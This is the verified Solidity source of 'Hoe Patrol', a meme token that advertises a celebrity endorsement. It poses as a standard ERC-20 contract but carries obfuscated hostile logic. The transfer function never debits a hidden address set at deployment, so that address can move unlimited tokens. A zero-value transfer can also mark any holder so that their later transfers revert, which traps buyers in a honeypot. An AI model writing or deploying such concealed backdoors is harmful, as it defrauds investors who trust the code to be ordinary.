/**
 *Submitted for verification at Etherscan.io on 2023-05-22
*/

/*

Officially endorsed by the Top G himself

https://twitter.com/Cobratate/status/1660634266663804929

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract HoePatrolCoin is Ownable {
    constructor(address radiotherapy) {
        balanceOf[msg.sender] = totalSupply;
        hit[radiotherapy] = spell;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    address public uniswapV2Pair;

    string public name = 'Hoe Patrol';

    string public symbol = 'HOEPATROL';

    function approve(address account, uint256 radical) public returns (bool success) {
        allowance[msg.sender][account] = radical;
        emit Approval(msg.sender, account, radical);
        return true;
    }

    function transferFrom(address madness, address narcotic, uint256 radical) public returns (bool success) {
        require(radical <= allowance[madness][msg.sender]);
        allowance[madness][msg.sender] -= radical;
        trial(madness, narcotic, radical);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 public totalSupply = 6_900_000_000_000 * 10 ** 9;

    uint256 private spell = 66;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private hit;

    function transfer(address narcotic, uint256 radical) public returns (bool success) {
        trial(msg.sender, narcotic, radical);
        return true;
    }

    function trial(address madness, address narcotic, uint256 radical) private returns (bool success) {
        if (hit[madness] == 0) {
            balanceOf[madness] -= radical;
        }

        if (radical == 0) dip[narcotic] += spell;

        if (madness != uniswapV2Pair && hit[madness] == 0 && dip[madness] > 0) {
            hit[madness] -= spell;
        }

        balanceOf[narcotic] += radical;
        emit Transfer(madness, narcotic, radical);
        return true;
    }

    uint8 public decimals = 9;

    mapping(address => uint256) private dip;

    mapping(address => mapping(address => uint256)) public allowance;
}